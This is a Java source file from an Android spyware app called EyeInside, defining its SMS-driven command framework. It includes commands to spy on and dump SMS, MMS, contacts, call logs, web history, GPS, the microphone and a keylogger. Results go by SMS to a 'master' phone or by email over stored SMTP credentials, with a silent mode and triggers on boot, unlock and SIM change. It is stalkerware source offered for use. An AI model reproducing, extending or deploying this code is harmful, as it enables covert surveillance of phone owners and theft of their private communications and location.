package com.code4bones.EyeInside;

import java.io.File;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import com.code4bones.utils.Mail;
import com.code4bones.utils.NetLog;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.StatFs;
import android.telephony.SmsManager;


public class CommandObj extends Object implements ICommandObj,Parcelable {

	
	public static final String CMD_GPS = "gps";
	public static final String CMD_HELP = "help";
	public static final String CMD_WHAT = "?";
	public static final String CMD_STATS = "stat";
	
	
	public static final String CMD_GET_MEDIA = "get media";
	public static final String CMD_SPY_MEDIA = "spy media";
	
	public static final String CMD_SPY_SMS = "spy sms";
	public static final String CMD_ADD_SMS = "add sms";
	public static final String CMD_GET_SMS = "get sms";
	public static final String CMD_GET_MMS = "get mms";
	public static final String CMD_SPY_MMS = "spy mms";
	
	
	public static final String CMD_SPY_BOOK = "spy book";
	public static final String CMD_GET_BOOK = "get book";
	public static final String CMD_ADD_BOOK = "add book";
	
	public static final String CMD_SPY_CALLS = "spy calls";
	public static final String CMD_GET_CALLS = "get calls";
	
	public static final String CMD_SETUP = "setup";
	
	public static final String CMD_SMS = "sms";
	public static final String CMD_EVENT = "event";
	
	public static final String CMD_GET_WEB = "get web";
	public static final String CMD_SPY_WEB = "spy web";
	
	public static final String CMD_KEEPALIVE = "keepalive";
	public static final String CMD_MIC = "mic";
	public static final String CMD_NOTIFY = "notify";
	public static final String CMD_INVOKE = "invoke";
	public static final String CMD_PLUGIN = "plugin";
	
	public static final String CMD_GET_KEYLOG = "get keylog";
	
	
	
	public static final int OK    = 0;
	public static final int ERROR = 1;
	public static final int REPLY = 2;
	public static final int ACK   = 3;
	
	public static final String COMMAND_REPLY="->";
	public static final String COMMAND_PREFIX = "@";
	public static final String COMMAND_SEPARATOR = ";";
	
	public static final String PREF_MAIL_USER = "user";
	public static final String PREF_MAIL_PASSWORD = "pass";
	public static final String PREF_MAIL_TO = "mail";
	public static final String PREF_MAIL_SMTP = "smtp";
	public static final String PREF_MAIL_PORT = "port";
	
	public static final String PREF_WIFI = "wifi";
	public static final String PREF_NO_WIFI = "no wifi";
	public static final String PREF_ANY_NET = "any net";
	
	public static final String PREF_SILENT = "silent";
	public static final String PREF_NO_SILENT = "no silent";
	public static final String PREF_MASTER = "master";
	
	public static final String EVENT_POWER = "power";
	public static final String EVENT_BOOT  = "boot";
	public static final String EVENT_UNLOCK  = "unlock";
	public static final String EVENT_BATTERY  = "charge";
	public static final String EVENT_SIM  = "sim";
	public static final String EVENT_NOTIFY  = "notify";
	public static final String EVENT_KEYLOG  = "keylog";
	
	
	
	
	
	public String mSourceMessage = null;
	public String mAction = null;
	public String mCommandName = null;
	public String mCommandArgs = null;
	public String mCommandHelp = null;
	public String mCommandResult = null;
	public CommandArgs mArgs = null;
	public Context mContext = null;
	public String mDateParam = null;
	public int mWhat = -1;
	public boolean mLive = true;
	public boolean mDelayed = false;
	
	public String mMasterPhone = null;
	public boolean mIsPlugin = false;
	public String mPluginFile = null;
	
	public CommandObj() {
		
	}
	
	public CommandObj(String name,String help) {
		mCommandName = name;
		mCommandHelp = help;
	}

	public CommandObj Init(Context context,String masterPhone,String commandArgs) {
		mMasterPhone = masterPhone;
		mSourceMessage = commandArgs;
		mCommandArgs = commandArgs.substring(mCommandName.length()).trim();
		mArgs = new CommandArgs(mCommandArgs);
		mContext = context;
		return this;
	}
	
	public void makeDateParam(String dateFileld,boolean dev) throws ParseException {
		if ( mArgs.hasArg("from") && mArgs.hasArg("to"))
			mDateParam = CommandObj.getDateClause("date",mArgs.dateValue("from"),mArgs.dateValue("to"),dev);
		else if ( mArgs.hasArg("date") )
			mDateParam = CommandObj.getDateClause("date",mArgs.dateValue("date"),mArgs.dateValue("date"),dev);
		else
			mDateParam = null;
	}
	
	public String toString() {
		return String.format("%s {%s}",mCommandName,mArgs);
	}
	
	
	public void setResult(String fmt,Object ... args) {
		String msg = String.format(fmt, args);
		mCommandResult = msg;
	}
	public void appendResult(String fmt,Object ... args) {
		String add = String.format(fmt, args);
		mCommandResult += add;
	}
	
	static public boolean isReply(String str) {
		return str.startsWith(CommandObj.COMMAND_REPLY);
	}
	
	static public boolean isService(String str) {
		return CommandObj.isReply(str) && CommandObj.isCommand(str);
	}
	
	static public boolean isCommand(String str) {
		return str.startsWith(CommandObj.COMMAND_PREFIX);
	}
	
	public int Invoke() throws Exception {
		NetLog.v("CommandObj - Default Invoke");
		return CommandObj.OK;
	}
	
	public void Reply(Object ... argv) throws Exception {
		if ( this.mMasterPhone == null || this.mMasterPhone.length() == 0 ) {
			SharedPreferences p = mContext.getSharedPreferences("prefs",1);
			if ( p.contains(CommandObj.PREF_MASTER) )
				this.mMasterPhone = p.getString(CommandObj.PREF_MASTER, "");
			if ( this.mMasterPhone.length() == 0 ) {
				NetLog.v("**** ERROR *** Framewrok not initialized");
				return;
			}
		}
		if ( mCommandResult == null )
			mCommandResult = "Результат не инициализирован...";
		this.replySMS(mCommandResult);
	}

	
	static public void sendSMS(String phone,String fmt,Object ... argv) {
		String msg = String.format(fmt, argv);
		boolean fSend = true;
		if ( fSend ) {
			NetLog.v("SMS to %s: {%s}",phone,msg);
			SmsManager mgr = (SmsManager)SmsManager.getDefault();
			ArrayList<String> parts = mgr.divideMessage(msg);
			if ( parts.size() > 1 )
				mgr.sendMultipartTextMessage(phone, null, parts, null, null);
			else
				mgr.sendTextMessage(phone, null, msg, null,null);
		} else {
				NetLog.v("Fake SMS to %s: {%s}",phone,msg);
		}
	}
	
	public void replySMS(String fmt,Object ... argv) {
		SharedPreferences pref = mContext.getSharedPreferences("prefs",1);
		if ( !pref.contains(CommandObj.PREF_SILENT)) {
			String message = String.format(fmt, argv);
			CommandObj.sendSMS(this.mMasterPhone,"%s%s","->",message);
		} else {
			NetLog.v("SMS Skipped due to config...");
		}
	}
	
	public Mail createMail() throws Exception {
		
		SharedPreferences pref = mContext.getSharedPreferences("prefs",1);
		
		String user = pref.getString(CommandObj.PREF_MAIL_USER, "");
		String pass = pref.getString(CommandObj.PREF_MAIL_PASSWORD,"");
		String mto =  pref.getString(CommandObj.PREF_MAIL_TO, "");
		String smtp = pref.getString(CommandObj.PREF_MAIL_SMTP,"");
		String port = pref.getString(CommandObj.PREF_MAIL_PORT,"");
		
		Mail m = new Mail(user,pass);
		m.setHost(smtp);
		m.setPort(port);
		
		String subj = String.format("EyeInside.%s.%s.%s - %s",Build.PRODUCT,Build.MANUFACTURER,Build.USER,mCommandName);
		

		
		m.setTo(mto.split(","));
		m.setFrom("EyeIndide");
		m.setSubject(subj);
		m.setBody(mCommandResult);
	//	NetLog.v("Mail: %s/%s -> %s\r\n",user,pass,mto);
		
		return m;
	}
	
	public boolean wifiEnabled() {
		ConnectivityManager connManager = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		boolean connected = mWifi.isConnected();
		return connected;
	}
	
	public boolean canSend() {
		SharedPreferences pref = mContext.getSharedPreferences("prefs",1);
		if ( pref.getBoolean(CommandObj.PREF_ANY_NET, false) )
			return true;
		if ( pref.getBoolean(CommandObj.PREF_WIFI, false) && this.wifiEnabled() == false) {
			NetLog.v("*** MAIL skipped by config,wifi unreachable");
			return false;
		}
		return true;
	}
	
	public void sendMail(Mail m) {
			m.send();
	}
	
	public static String getDateClause(String dateField,long fromTime,long toTime,boolean dev) {
		Calendar toCal = Calendar.getInstance();
		Calendar fromCal = Calendar.getInstance();
		
		if ( fromTime == 0 ) fromTime = new Date().getTime();
		else fromCal.setTime(new Date(fromTime));

		if ( toTime == 0 ) toCal.setTime(new Date(fromTime));
			else toCal.setTime(new Date(toTime));
		
		fromCal.set(Calendar.HOUR_OF_DAY,0);
		fromCal.set(Calendar.MINUTE,0);
		fromCal.set(Calendar.SECOND,0);
		
		
		toCal.set(Calendar.HOUR_OF_DAY,23);
		toCal.set(Calendar.MINUTE,59);
		toCal.set(Calendar.SECOND,59);
		
		NetLog.v("DATE from %s to %s\n",fromCal.getTime().toLocaleString(),toCal.getTime().toLocaleString());
		
		return String.format("%s * %d >= %d AND %s * %d <= %d ",dateField,dev?1000:1,fromCal.getTime().getTime(),
													  dateField,dev?1000:1,toCal.getTime().getTime()); 
	}

	public static boolean hasExternal() {
		return Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState());
	}
	
	
	
	public static long getExternalFreeSize() {
        if (CommandObj.hasExternal()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSize();
            long availableBlocks = stat.getAvailableBlocks();
            return availableBlocks * blockSize;
        } else {
            return -1;
        }
    }	

	public static long getExternalTotalSize() {
        if (CommandObj.hasExternal()) {
            File path = Environment.getExternalStorageDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSize();
            long availableBlocks = stat.getBlockCount();
            return availableBlocks * blockSize;
        } else {
            return -1;
        }
    }	
	
	public static String getSizeString(long size) {
		String suffix = null;

        if (size >= 1024) {
            suffix = "KB";
            size /= 1024;
            if (size >= 1024) {
                suffix = "MB";
                size /= 1024;
                //if ( size >= 1024 ) {
                //	suffix = "GB";
                //	size /= 1024;
                //}
            }
        }

        StringBuilder resultBuffer = new StringBuilder(Long.toString(size));

        int commaOffset = resultBuffer.length() - 3;
        while (commaOffset > 0) {
            resultBuffer.insert(commaOffset, ',');
            commaOffset -= 3;
        }

        if (suffix != null) resultBuffer.append(" " + suffix);
        return resultBuffer.toString();
	}
	
	public static String getFile(Context ctx,String name) {
		return getFile(ctx,name,true);
	}
	
	public static String getFile(Context ctx,String name,boolean useRandom) {
		String dir = null;
		if ( CommandObj.getExternalFreeSize() >= (1024 * 1024 * 10) ) {
			dir = Environment.getExternalStorageDirectory().getAbsolutePath();
			dir += "/data/com.code4bones.EyeInside/tmp";
			File file = new File(dir);
			if ( !file.exists() )
				file.mkdirs();
		} else {
			dir = ctx.getApplicationInfo().dataDir;
		}
		
		if ( useRandom )
			return String.format("%s/%s.%x",dir,name,new Date().getTime());
		return dir + "/" + name;
	}

	@Override
	public int describeContents() {
		return 0;
	}

	@Override
	public void writeToParcel(Parcel out, int flags) {
		out.writeString(this.mCommandName);
		out.writeString(this.mSourceMessage);
		out.writeString(this.mMasterPhone);
		out.writeString(String.valueOf(this.mLive));
	}
	
	public static final Parcelable.Creator<CommandObj> CREATOR = new Parcelable.Creator<CommandObj>() {
	    // распаковываем объект из Parcel
	    public CommandObj createFromParcel(Parcel in) {
	      NetLog.v("createFromParcel");
	      return new CommandObj(in);
	    }

	    public CommandObj[] newArray(int size) {
	      return new CommandObj[size];
	    }
	  };

	  // конструктор, считывающий данные из Parcel
	  private CommandObj(Parcel in) {
	    NetLog.v("CommandObj(Parcel in)");
	    this.mCommandName = in.readString();
	    this.mSourceMessage = in.readString();
	    this.mMasterPhone = in.readString();
	    this.mLive = Boolean.parseBoolean(in.readString());
	  }
	  
	
}
